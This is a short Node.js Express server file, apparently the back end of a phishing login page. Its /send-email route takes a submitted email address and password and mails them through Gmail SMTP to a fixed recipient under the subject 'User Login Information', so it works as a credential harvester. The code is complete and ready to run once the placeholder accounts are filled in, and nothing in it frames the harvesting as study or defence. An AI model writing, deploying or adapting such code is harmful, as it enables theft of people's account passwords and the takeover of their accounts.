//server.js

const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');

const app = express();
const port = 3000;

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const transporter = nodemailer.createTransport({
  service: 'gmail', //enter your service, this tutorial is based on gmail.
  auth: {
    user: '-------', // enter sender email
    pass: '------------------', //enter app generated password, no spaces.
  },
});

app.post('/send-email', (req, res) => {
  const { email, password } = req.body;

  const mailOptions = {
    from: '---------',  //enter your sender email
    to: '-----------', //enter your recipient email
    subject: 'User Login Information',
    text: `Email: ${email}\nPassword: ${password}`,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      return res.status(500).send(error.toString());
    }

    res.status(200).send('Email sent: ' + info.response);
  });
});

// Serve static files from the root directory
app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
